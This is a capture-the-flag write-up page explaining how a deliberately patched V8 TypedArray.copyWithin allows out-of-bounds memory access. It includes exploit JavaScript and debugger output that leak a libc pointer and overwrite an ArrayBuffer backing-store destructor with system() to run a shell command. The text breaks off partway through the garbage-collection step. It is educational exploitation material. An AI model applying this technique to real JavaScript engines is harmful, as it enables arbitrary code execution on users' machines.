@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+
+<html>
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<meta content="KxBie6T6uw1Iexm0-tldr4zEIM4zAUdDLF9N_t97cIE" name="google-site-verification"/>
+<meta content="CTF writeups made by LUHack members." name="description">
+<meta content="VVVV8" property="og:title"/>
+<meta content="website" property="og:type"/>
+<meta content="../../static/images/logo_small.png" property="og:image"/>
+<meta content="" property="og:url"/>
+<meta content="LUHack" property="og:site_name"/>
+<meta content="CTF writeups made by LUHack members." property="og:description"/>
+<link href="../../static/images/apple-touch-icon-57x57.png" rel="apple-touch-icon-precomposed" sizes="57x57"/>
+<link href="../../static/images/apple-touch-icon-114x114.png" rel="apple-touch-icon-precomposed" sizes="114x114">
+<link href="../../static/images/apple-touch-icon-72x72.png" rel="apple-touch-icon-precomposed" sizes="72x72"/>
+<link href="../../static/images/apple-touch-icon-144x144.png" rel="apple-touch-icon-precomposed" sizes="144x144"/>
+<link href="../../static/images/apple-touch-icon-60x60.png" rel="apple-touch-icon-precomposed" sizes="60x60"/>
+<link href="../../static/images/apple-touch-icon-120x120.png" rel="apple-touch-icon-precomposed" sizes="120x120"/>
+<link href="../../static/images/apple-touch-icon-76x76.png" rel="apple-touch-icon-precomposed" sizes="76x76"/>
+<link href="../../static/images/apple-touch-icon-152x152.png" rel="apple-touch-icon-precomposed" sizes="152x152"/>
+<link href="../../static/images/favicon-196x196.png" rel="icon" sizes="196x196" type="image/png"/>
+<link href="../../static/images/favicon-96x96.png" rel="icon" sizes="96x96" type="image/png"/>
+<link href="../../static/images/favicon-32x32.png" rel="icon" sizes="32x32" type="image/png"/>
+<link href="../../static/images/favicon-16x16.png" rel="icon" sizes="16x16" type="image/png"/>
+<link href="../../static/images/favicon-128.png" rel="icon" sizes="128x128" type="image/png"/>
+<meta content="LUHack" name="application-name"/>
+<meta content="#FFFFFF" name="msapplication-TileColor"/>
+<meta content="../../static/images/mstile-144x144.png" name="msapplication-TileImage"/>
+<meta content="../../static/images/mstile-70x70.png" name="msapplication-square70x70logo"/>
+<meta content="../../static/images/mstile-150x150.png" name="msapplication-square150x150logo"/>
+<meta content="../../static/images/mstile-310x150.png" name="msapplication-wide310x150logo"/>
+<meta content="../../static/images/mstile-310x310.png" name="msapplication-square310x310logo"/>
+<script type="application/ld+json">
+     {
+         "@context": "https://schema.org",
+         "@type": "Article",
+         "author": "simmsb",
+         "name": "VVVV8",
+         "about": "Cyber Security",
+         "url": "",
+         "datePublished": "2020-11-23T19:44:50.787619",
+         "dateModified": "2020-11-23T19:44:50.787619",
+         "publsher": {
+             "@type": "Organization",
+             "name": "LUHack"
+         }
+     }
+    </script>
+<title>LUHack Writeup: VVVV8</title>
+<link href="../../_assets/cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/fontawesome.min.css" referrerpolicy="no-referrer" rel="stylesheet"/>
+<link href="../../_assets/cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/solid.min.css" referrerpolicy="no-referrer" rel="stylesheet"/>
+<link href="../../_assets/cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/brands.min.css" referrerpolicy="no-referrer" rel="stylesheet"/>
+<link href="../../_assets/unpkg.com/purecss%402.0.3/build/pure-min.css" rel="stylesheet"/>
+<link href="../../_assets/fonts.googleapis.com/css_81f601ca.css" rel="stylesheet"/>
+<link href="../../static/css/main.css" rel="stylesheet"/>
+<link href="../../static/css/highlight.min.css" rel="stylesheet"/>
+<script defer="" src="../../static/js/base.js"></script>
+</link></meta></head>
+<body>
+<div class="with-sidebar">
+<div class="fill-height">
+<div class="sidebar" id="menu">
+<div class="header">
+<h1 class="brand-title">
+<a class="logo" href="../../index.html">
+<img alt="LUHack logo" src="../../static/images/luhack_logo.png" width="100%"/>
+</a>
+</h1>
+<nav class="nav">
+<ul class="nav-list">
+<li class="nav-item">
+<a class="button" href="../../index.html">Home</a>
+</li>
+<li class="nav-item">
+<a class="button" href="../index.html">Writeups</a>
+</li>
+<li class="nav-item">
+<a class="button" href="../../challenges/index.html">Challenges</a>
+</li>
+<br/>
+<li class="nav-item">
+<a class="button" href="../tags.html">Tag List</a>
+</li>
+<li class="nav-item">
+<a class="button" href="../new.html">New Writeup</a>
+</li>
+</ul>
+</nav>
+<br/>
+<form action="../index.html" class="pure-form" method="GET">
+<input autocomplete="off" class="search-bar" id="search-bar" name="search" placeholder="Search writeups" type="search" value=""/>
+</form>
+<div class="header-content">
+<div class="article-meta">
+<h2>VVVV8</h2>
+<h4 class="author">By: <a href="../user/simmsb.html">simmsb</a></h4>
+<h4 class="date">2020-11-23 19:44:50.787619</h4>
+<div class="tags">
+<a class="post-category" href="../tag/htbctf.html">htbctf</a>
+<a class="post-category" href="../tag/pwn.html">pwn</a>
+<a class="post-category" href="../tag/reverse-engineering.html">reverse-engineering</a>
+</div>
+</div>
+</div>
+</div>
+<div class="footer">
+<div class="legal">
+<div class="">
+<a href="#" title="Sign In">Sign In</a>
+</div>
+</div>
+</div>
+</div>
+<div class="not-sidebar">
+<main>
+<h1>VVVV8</h1>
+<h2>The vulnerability</h2>
+<p>VVVV8 is a patch to <a href="https://github.com/v8/v8/">V8</a> that adds a fourth parameter to
+<code>TypedArray.copyWithin</code>.</p>
+<div class="highlight"><pre><span></span><span class="gh">diff --git a/src/builtins/builtins-typed-array.cc b/src/builtins/builtins-typed-array.cc</span><span class="w"></span>
+<span class="gh">index fdadc7a554..81b6290f6e 100644</span><span class="w"></span>
+<span class="gd">--- a/src/builtins/builtins-typed-array.cc</span><span class="w"></span>
+<span class="gi">+++ b/src/builtins/builtins-typed-array.cc</span><span class="w"></span>
+<span class="gu">@@ -56,6 +56,8 @@ BUILTIN(TypedArrayPrototypeCopyWithin) {</span><span class="w"></span>
+<span class="w"> </span>  int64_t from = 0;<span class="w"></span>
+<span class="w"> </span>  int64_t final = len;<span class="w"></span>
+
+<span class="gi">+  size_t element_size = array-&gt;element_size();</span><span class="w"></span>
+<span class="gi">+</span><span class="w"></span>
+<span class="w"> </span>  if (V8_LIKELY(args.length() &gt; 1)) {<span class="w"></span>
+<span class="w"> </span>    Handle&lt;Object&gt; num;<span class="w"></span>
+<span class="w"> </span>    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(<span class="w"></span>
+<span class="gu">@@ -67,11 +69,17 @@ BUILTIN(TypedArrayPrototypeCopyWithin) {</span><span class="w"></span>
+<span class="w"> </span>          isolate, num, Object::ToInteger(isolate, args.at&lt;Object&gt;(2)));<span class="w"></span>
+<span class="w"> </span>      from = CapRelativeIndex(num, 0, len);<span class="w"></span>
+
+<span class="gd">-      Handle&lt;Object&gt; end = args.atOrUndefined(isolate, 3);</span><span class="w"></span>
+<span class="gd">-      if (!end-&gt;IsUndefined(isolate)) {</span><span class="w"></span>
+<span class="gd">-        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, num,</span><span class="w"></span>
+<span class="gd">-                                           Object::ToInteger(isolate, end));</span><span class="w"></span>
+<span class="gi">+      if (args.length() &gt; 3) {</span><span class="w"></span>
+<span class="gi">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><span class="w"></span>
+<span class="gi">+            isolate, num, Object::ToInteger(isolate, args.at&lt;Object&gt;(3)));</span><span class="w"></span>
+<span class="w"> </span>        final = CapRelativeIndex(num, 0, len);<span class="w"></span>
+<span class="gi">+</span><span class="w"></span>
+<span class="gi">+        Handle&lt;Object&gt; type_len = args.atOrUndefined(isolate, 4);</span><span class="w"></span>
+<span class="gi">+        if (!type_len-&gt;IsUndefined(isolate)) {</span><span class="w"></span>
+<span class="gi">+          ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, num,</span><span class="w"></span>
+<span class="gi">+                                            Object::ToUint32(isolate, type_len));</span><span class="w"></span>
+<span class="gi">+          element_size = CapRelativeIndex(num, 0, 8);</span><span class="w"></span>
+<span class="gi">+        }</span><span class="w"></span>
+<span class="w"> </span>      }<span class="w"></span>
+<span class="w"> </span>    }<span class="w"></span>
+<span class="w"> </span>  }<span class="w"></span>
+<span class="gu">@@ -92,8 +100,13 @@ BUILTIN(TypedArrayPrototypeCopyWithin) {</span><span class="w"></span>
+<span class="w"> </span>  DCHECK_GE(to, 0);<span class="w"></span>
+<span class="w"> </span>  DCHECK_LT(to, len);<span class="w"></span>
+<span class="w"> </span>  DCHECK_GE(len - count, 0);<span class="w"></span>
+<span class="gi">+  DCHECK_LE(element_size, 8);</span><span class="w"></span>
+<span class="gi">+  DCHECK_GT(element_size, 0);</span><span class="w"></span>
+<span class="gi">+</span><span class="w"></span>
+<span class="gi">+  if (element_size != 1 &amp;&amp; element_size % 2 == 1) {</span><span class="w"></span>
+<span class="gi">+    element_size = array-&gt;element_size();</span><span class="w"></span>
+<span class="gi">+  }</span><span class="w"></span>
+
+<span class="gd">-  size_t element_size = array-&gt;element_size();</span><span class="w"></span>
+<span class="w"> </span>  to = to * element_size;<span class="w"></span>
+<span class="w"> </span>  from = from * element_size;<span class="w"></span>
+<span class="w"> </span>  count = count * element_size;<span class="w"></span>
+</pre></div>
+<p><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/TypedArray">TypedArray</a>
+is an interface used by objects such as
+<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Uint8Array">Uint8Array</a>
+These objects can be used to wrap
+<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/ArrayBuffer">ArrayBuffer</a>s,
+providing access to the buffer.</p>
+<p><code>TypedArray.copyWithin</code> is a method used for copying data around inside the
+buffer, before any data is copied, the runtime first makes sure that data is
+within the bounds of the backing buffer to prevent any Out-Of-Bounds read or
+writes occuring. After those checks have passed, V8 simply performs a <code>memmove</code>
+on the backing buffer:</p>
+<div class="highlight"><pre><span></span><span class="kt">uint8_t</span><span class="o">*</span><span class="w"> </span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">static_cast</span><span class="o">&lt;</span><span class="kt">uint8_t</span><span class="o">*&gt;</span><span class="p">(</span><span class="n">array</span><span class="o">-&gt;</span><span class="n">DataPtr</span><span class="p">());</span><span class="w"></span>
+<span class="n">std</span><span class="o">::</span><span class="n">memmove</span><span class="p">(</span><span class="n">data</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">to</span><span class="p">,</span><span class="w"> </span><span class="n">data</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">from</span><span class="p">,</span><span class="w"> </span><span class="n">count</span><span class="p">);</span><span class="w"></span>
+</pre></div>
+<p><code>TypedArray.copyWithin</code> can be used by arrays with many differrent element size,
+for example: <code>Uint8Array</code> and <code>BigUint64Array</code>. Because <code>copyWithin</code> is given
+indexes into the array it needs to know the width of the elements of the array
+as well as the total size of the array, the indexes passed to <code>copyWithin</code> are
+multiplied by the element size to determine the byte indexes to pass to memmove:</p>
+<div class="highlight"><pre><span></span><span class="kt">size_t</span><span class="w"> </span><span class="n">element_size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">array</span><span class="o">-&gt;</span><span class="n">element_size</span><span class="p">();</span><span class="w"></span>
+<span class="n">to</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">element_size</span><span class="p">;</span><span class="w"></span>
+<span class="n">from</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">element_size</span><span class="p">;</span><span class="w"></span>
+<span class="n">count</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">count</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">element_size</span><span class="p">;</span><span class="w"></span>
+</pre></div>
+<p>The patch adds a fourth parameter to this function, which allows for overriding
+the <code>element_size</code> value, because the byte offset is <code>index * element_size</code>, if
+the <em>actual</em> element size is less than the provided element size, it becomes
+possible to read and write out of bounds of the backing array.</p>
+<h2>Looking for things to leverage</h2>
+<p>After running the following snippet we can use <code>%DebugPrint</code> to find the address
+of the backing store and inspect the memory around the buffer of <code>buf</code>.</p>
+<div class="highlight"><pre><span></span><span class="kd">var</span><span class="w"> </span><span class="nx">buffers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[];</span><span class="w"></span>
+<span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kd">var</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">49</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">b</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">ArrayBuffer</span><span class="p">(</span><span class="mf">24</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">u</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Uint8Array</span><span class="p">(</span><span class="nx">b</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="nx">u</span><span class="p">.</span><span class="nx">fill</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="nx">buffers</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">b</span><span class="p">);</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+
+
+<span class="kd">var</span><span class="w"> </span><span class="nx">buf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">ArrayBuffer</span><span class="p">(</span><span class="mf">64</span><span class="p">);</span><span class="w"></span>
+
+<span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kd">var</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">51</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">90</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">b</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">ArrayBuffer</span><span class="p">(</span><span class="mf">24</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">u</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Uint8Array</span><span class="p">(</span><span class="nx">b</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="nx">u</span><span class="p">.</span><span class="nx">fill</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span><span class="w"></span>
+<span class="w">  </span><span class="nx">buffers</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">b</span><span class="p">);</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</pre></div>
+<p>The output of <code>%DebugPrint</code> shows that the buffer is located at 0x555556ad2380</p>
+<pre><code>d8&gt; %DebugPrint(buf)
+DebugPrint: 0x349b0808654d: [JSArrayBuffer]
+ - map: 0x349b08243185 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]
+ - prototype: 0x349b08208ba1 &lt;Object map = 0x349b082431ad&gt;
+ - elements: 0x349b080426e5 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
+ - embedder fields: 2
+ - backing_store: 0x555556ad2380
+ - byte_length: 64
+ - detachable
+ - properties: 0x349b080426e5 &lt;FixedArray[0]&gt; {}
+ - embedder fields = {
+    0, aligned pointer: (nil)
+    0, aligned pointer: (nil)
+ }
+</code></pre>
+<p><a href="https://fineas.github.io/FeDEX/post/chromium_rce.html">This writeup</a> documents
+the heap layout of <code>BackingStore</code>s and points out that they have a <a href="https://github.com/v8/v8/blob/c48ae2d96cbfdc2216706a5e9a79ae1dce5a638b/src/objects/backing-store.h#L194">pointer
+field</a>,
+which when a flag is set will be
+<a href="https://github.com/v8/v8/blob/c48ae2d96cbfdc2216706a5e9a79ae1dce5a638b/src/objects/backing-store.cc#L196-L197">called</a>
+upon the backing store being garbage collected, if we overwrite this and set the
+flag we can call any function (such as <code>system</code>) with the first parameter being
+the contents of the buffer!.</p>
+<p>From looking at the memory dump, we can see that the destructor for one of the
+buffers is located at offset <code>104</code> from the start of <code>buf</code>'s backing store,
+there is also a pointer at offset <code>192</code> that happens to point into libc, this is
+very useful as it can be used to defeat ASLR.</p>
+<div class="highlight"><pre><span></span><span class="n">gdb</span><span class="o">-</span><span class="n">peda$</span><span class="w"> </span><span class="n">tele</span><span class="w"> </span><span class="mh">0x555556ad2380</span><span class="w"> </span><span class="mi">20</span><span class="w"></span>
+<span class="mo">00</span><span class="mi">88</span><span class="o">|</span><span class="w"> </span><span class="mh">0x555556ad23d8</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="mh">0x40</span><span class="w"> </span><span class="p">(</span><span class="sc">'@'</span><span class="p">)</span><span class="w"></span>
+<span class="mo">00</span><span class="mi">96</span><span class="o">|</span><span class="w"> </span><span class="mh">0x555556ad23e0</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="mh">0x40</span><span class="w"> </span><span class="p">(</span><span class="sc">'@'</span><span class="p">)</span><span class="w"></span>
+<span class="mo">0104</span><span class="o">|</span><span class="w"> </span><span class="mh">0x555556ad23e8</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="mh">0x7fffffffe1a8</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="mh">0x555556a0f8e8</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="mh">0x555555cedd40</span><span class="w"> </span><span class="p">(</span><span class="o">&lt;</span><span class="n">_ZN2v812_GLOBAL__N_124ArrayBufferAllocatorBaseD2Ev</span><span class="o">&gt;:</span><span class="w">      </span><span class="p">)</span><span class="w"></span>
+<span class="mo">0112</span><span class="o">|</span><span class="w"> </span><span class="mh">0x555556ad23f0</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="mh">0x31180a03e5115d01</span><span class="w"> </span>
+<span class="mo">0120</span><span class="o">|</span><span class="w"> </span><span class="mh">0x555556ad23f8</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="mh">0x105d80240c1c0208</span><span class="w"> </span>
+<span class="mo">012</span><span class="mi">8</span><span class="o">|</span><span class="w"> </span><span class="mh">0x555556ad2400</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="mh">0x0</span><span class="w"> </span>
+<span class="mo">0136</span><span class="o">|</span><span class="w"> </span><span class="mh">0x555556ad2408</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="mh">0x31</span><span class="w"> </span><span class="p">(</span><span class="sc">'1'</span><span class="p">)</span><span class="w"></span>
+<span class="mo">0144</span><span class="o">|</span><span class="w"> </span><span class="mh">0x555556ad2410</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="mh">0x555556a0fe38</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="mh">0x555555cdb130</span><span class="w"> </span><span class="p">(</span><span class="o">&lt;</span><span class="n">__jit_debug_register_code</span><span class="o">&gt;:</span><span class="w">  </span><span class="n">push</span><span class="w">   </span><span class="n">rbp</span><span class="p">)</span><span class="w"></span>
+<span class="mo">0152</span><span class="o">|</span><span class="w"> </span><span class="mh">0x555556ad2418</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="mh">0x0</span><span class="w"> </span>
+<span class="mo">0160</span><span class="o">|</span><span class="w"> </span><span class="mh">0x555556ad2420</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="mh">0x0</span><span class="w"> </span>
+<span class="mo">016</span><span class="mi">8</span><span class="o">|</span><span class="w"> </span><span class="mh">0x555556ad2428</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="mh">0x555556ad23d0</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="mh">0x555556ad2380</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="mh">0x0</span><span class="w"> </span>
+<span class="mo">0176</span><span class="o">|</span><span class="w"> </span><span class="mh">0x555556ad2430</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="mh">0x0</span><span class="w"> </span>
+<span class="mo">01</span><span class="mi">84</span><span class="o">|</span><span class="w"> </span><span class="mh">0x555556ad2438</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="mh">0x31</span><span class="w"> </span><span class="p">(</span><span class="sc">'1'</span><span class="p">)</span><span class="w"></span>
+<span class="mo">01</span><span class="mi">92</span><span class="o">|</span><span class="w"> </span><span class="mh">0x555556ad2440</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="mh">0x7ffff7dc0000</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="mh">0x25fff4d430</span><span class="w"> </span>
+<span class="mo">0200</span><span class="o">|</span><span class="w"> </span><span class="mh">0x555556ad2448</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="mh">0x555556ad23d0</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="mh">0x555556ad2380</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="mh">0x0</span><span class="w"></span>
+</pre></div>
+<p>I wrote the following code to extract the pointer to libc by reading out of
+bounds from <code>buf</code>'s buffer:</p>
+<div class="highlight"><pre><span></span><span class="kd">var</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Uint8Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span><span class="w"></span>
+
+<span class="kd">var</span><span class="w"> </span><span class="nx">close_to_libc_offset</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">192</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mf">8</span><span class="p">;</span><span class="w"></span>
+<span class="kd">var</span><span class="w"> </span><span class="nx">destrutor_offset</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">104</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mf">8</span><span class="p">;</span><span class="w"></span>
+
+<span class="kd">var</span><span class="w"> </span><span class="nx">u64view</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">BigUint64Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span><span class="w"></span>
+
+<span class="nx">view</span><span class="p">.</span><span class="nx">copyWithin</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">close_to_libc_offset</span><span class="p">,</span><span class="w"> </span><span class="nx">close_to_libc_offset</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mf">8</span><span class="p">,</span><span class="w"> </span><span class="mf">8</span><span class="p">);</span><span class="w"></span>
+<span class="kd">var</span><span class="w"> </span><span class="nx">libcptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">u64view</span><span class="p">[</span><span class="mf">0</span><span class="p">];</span><span class="w"></span>
+
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`libcptr: </span><span class="si">${</span><span class="nx">libcptr</span><span class="si">}</span><span class="sb">`</span><span class="p">)</span><span class="w"></span>
+</pre></div>
+<p>GDB can then be used to get the address of <code>system</code> and calculate it's offset
+from this pointer into libc, after running this a few times with ASLR on, I
+found that the pointer into libc isn't always at the same offset from libc, but
+a few of the least significant bits vary, this isn't a problem since we can
+still guess those bits.</p>
+<div class="highlight"><pre><span></span><span class="n">gdb</span><span class="o">-</span><span class="n">peda$</span><span class="w"> </span><span class="n">p</span><span class="w"> </span><span class="n">system</span><span class="w"></span>
+<span class="n">$1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="o">&lt;</span><span class="n">text</span><span class="w"> </span><span class="n">variable</span><span class="p">,</span><span class="w"> </span><span class="n">no</span><span class="w"> </span><span class="n">debug</span><span class="w"> </span><span class="n">info</span><span class="o">&gt;</span><span class="p">}</span><span class="w"> </span><span class="mh">0x7ffff7c56830</span><span class="w"> </span><span class="o">&lt;</span><span class="n">system</span><span class="o">&gt;</span><span class="w"></span>
+<span class="n">gdb</span><span class="o">-</span><span class="n">peda$</span><span class="w"> </span><span class="n">p</span><span class="w"> </span><span class="mh">0x7ffff7dc0000</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mh">0x7ffff7c56830</span><span class="w"></span>
+<span class="n">$2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x1697d0</span><span class="w"></span>
+</pre></div>
+<h2>Exploitation</h2>
+<p>The following code calculates the address of <code>system</code> and writes it into the
+correct offset, as well as setting the correct flags so that the custom
+destructor is called when the buffer is GCd:</p>
+<div class="highlight"><pre><span></span><span class="kd">var</span><span class="w"> </span><span class="nx">destrutor_offset</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">104</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mf">8</span><span class="p">;</span><span class="w"></span>
+
+<span class="kd">var</span><span class="w"> </span><span class="nx">system_offset_from_libc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">-</span><span class="mh">0x1697d0n</span><span class="p">;</span><span class="w"> </span>
+
+<span class="c1">// one out of ten times this is correct</span><span class="w"></span>
+<span class="kd">var</span><span class="w"> </span><span class="nx">random_offset</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xa000n</span><span class="p">;</span><span class="w"></span>
+
+<span class="kd">var</span><span class="w"> </span><span class="nx">system_addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">libcptr</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">system_offset_from_libc</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">random_offset</span><span class="p">;</span><span class="w"></span>
+
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`system_addr: </span><span class="si">${</span><span class="nx">system_addr</span><span class="si">}</span><span class="sb">`</span><span class="p">)</span><span class="w"></span>
+
+<span class="c1">// write the address of system to the destructor of the </span><span class="w"></span>
+<span class="c1">// buffer and set it's custom destructor flag</span><span class="w"></span>
+
+<span class="nx">view</span><span class="p">.</span><span class="nx">copyWithin</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">destrutor_offset</span><span class="p">,</span><span class="w"> </span><span class="nx">destrutor_offset</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mf">8</span><span class="p">,</span><span class="w"> </span><span class="mf">8</span><span class="p">);</span><span class="w"></span>
+<span class="nx">u64view</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">system_addr</span><span class="p">;</span><span class="w"></span>
+<span class="nx">u64view</span><span class="p">[</span><span class="mf">2</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x40n</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nx">u64view</span><span class="p">[</span><span class="mf">2</span><span class="p">];</span><span class="w"></span>
+<span class="nx">view</span><span class="p">.</span><span class="nx">copyWithin</span><span class="p">(</span><span class="nx">destrutor_offset</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="mf">8</span><span class="p">,</span><span class="w"> </span><span class="mf">8</span><span class="p">);</span><span class="w"></span>
+</pre></div>
+<p>Now we just need to copy our payload into the buffer:</p>
+<div class="highlight"><pre><span></span><span class="kd">var</span><span class="w"> </span><span class="nx">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Uint8Array</span><span class="p">.</span><span class="kr">from</span><span class="p">(</span><span class="s2">"/bin/ls\x00\x00"</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">''</span><span class="p">).</span><span class="nx">map</span><span class="p">(</span><span class="nx">c</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">c</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="mf">0</span><span class="p">)));</span><span class="w"></span>
+<span class="nx">view</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="nx">cmd</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">);</span><span class="w"></span>
+</pre></div>
+<p>To make sure our buffer isn't referenced all the exploitation code is put in a
+function (that I named <code>exploit</code>), then all that's needed is to force a garbage
+collect by allocating some large buffers:</p>
+<div class="highlight"><pre><span></span><span class="kd">function</span><span class="w"> </span><span class="nx">gc</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
